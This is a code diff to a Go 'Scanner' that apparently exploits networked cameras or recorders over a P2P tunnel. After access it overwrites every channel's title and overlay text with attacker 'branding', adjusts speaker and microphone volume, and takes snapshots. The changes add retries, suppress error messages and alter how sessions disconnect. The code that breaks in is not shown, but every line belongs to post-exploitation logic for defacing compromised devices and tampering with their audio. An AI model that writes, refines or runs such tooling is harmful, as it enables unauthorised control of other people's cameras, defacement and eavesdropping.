@@ -217,9 +217,7 @@ func (s *Scanner) applyAudioSettings(tunnel *p2p.PTCPTunnel) {
 	if !s.Config.Audio.Enabled || tunnel == nil {
 		return
 	}
-	if err := tunnel.SetAudioVolume(s.Config.Audio.SpeakerVolume, s.Config.Audio.MicVolume); err != nil {
-		fmt.Printf("[!] SetAudioVolume: %v\n", err)
-	}
+	tunnel.SetAudioVolume(s.Config.Audio.SpeakerVolume, s.Config.Audio.MicVolume)
 }
 
 func (s *Scanner) applyBranding(tunnel *p2p.PTCPTunnel, serial string, res *ExploitResult) {
@@ -233,11 +231,19 @@ func (s *Scanner) applyBranding(tunnel *p2p.PTCPTunnel, serial string, res *Expl
 		return r
 	}
 
+	const maxRetries = 3
+	const retryDelay = 200 * time.Millisecond
+
 	if s.Config.Brand.ChannelTitle != "" {
 		title := replacePlaceholders(s.Config.Brand.ChannelTitle)
 		for ch := 0; ch < res.Channels; ch++ {
-			if err := tunnel.SetChannelTitle(ch, title); err != nil {
-				fmt.Printf("[!] SetChannelTitle ch%d: %v\n", ch, err)
+			for attempt := 0; attempt < maxRetries; attempt++ {
+				if err := tunnel.SetChannelTitle(ch, title); err == nil {
+					break
+				}
+				if attempt < maxRetries-1 {
+					time.Sleep(retryDelay)
+				}
 			}
 		}
 	}
@@ -248,8 +254,13 @@ func (s *Scanner) applyBranding(tunnel *p2p.PTCPTunnel, serial string, res *Expl
 			lines[i] = replacePlaceholders(line)
 		}
 		for ch := 0; ch < res.Channels; ch++ {
-			if err := tunnel.SetOverlayText(ch, lines); err != nil {
-				fmt.Printf("[!] SetOverlayText ch%d: %v\n", ch, err)
+			for attempt := 0; attempt < maxRetries; attempt++ {
+				if err := tunnel.SetOverlayText(ch, lines); err == nil {
+					break
+				}
+				if attempt < maxRetries-1 {
+					time.Sleep(retryDelay)
+				}
 			}
 		}
 	}
@@ -354,7 +365,8 @@ func (s *Scanner) processExploit(serial string, client *p2p.DHClient, tunnel *p2
 				s.applyBranding(activeTunnel, serial, res)
 				s.applyAudioSettings(activeTunnel)
 				if fresh {
-					go activeTunnel.Disconnect()
+					time.Sleep(300 * time.Millisecond)
+					activeTunnel.Disconnect()
 				}
 				if !s.launchSnapshot(serial, res) {
 					s.mu.Lock()
@@ -374,7 +386,8 @@ func (s *Scanner) processExploit(serial string, client *p2p.DHClient, tunnel *p2
 				s.applyBranding(activeTunnel, serial, res)
 				s.applyAudioSettings(activeTunnel)
 				if fresh {
-					go activeTunnel.Disconnect()
+					time.Sleep(300 * time.Millisecond)
+					activeTunnel.Disconnect()
 				}
 				if !s.launchSnapshot(serial, res) {
 					s.mu.Lock()
